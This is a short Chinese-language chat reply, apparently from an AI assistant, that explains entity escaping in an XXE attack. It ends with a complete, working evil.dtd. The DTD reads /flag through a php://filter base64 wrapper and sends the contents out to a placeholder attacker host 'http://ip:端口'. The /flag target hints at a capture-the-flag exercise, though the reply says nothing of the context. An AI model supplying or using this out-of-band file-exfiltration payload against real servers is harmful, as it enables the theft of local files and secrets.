## Sonnet-4.6

你说得对，让我澄清一下：

`&#x25;` 的转义规则具体是这样的：

```xml
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://vps/?x=%file;'>">
```

- **`&#x25;`** —— 用在**外层字符串内部**，用来定义一个新的参数实体（`% send`），因为在字符串字面量里直接写 `%` 会被解析器提前解释，所以要转义
- **`%file;`** —— 这里是**引用**已经定义好的实体，不需要转义，直接写 `%file;` 就行

简单记忆：

|位置|写法|
|---|---|
|在字符串内**定义**新参数实体|`&#x25; 实体名`|
|在字符串内**引用**已有参数实体|`%实体名;`|

所以你的 evil.dtd 正确写法应该是：

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://ip:端口/?x=%file;'>">
%eval;
%send;
```
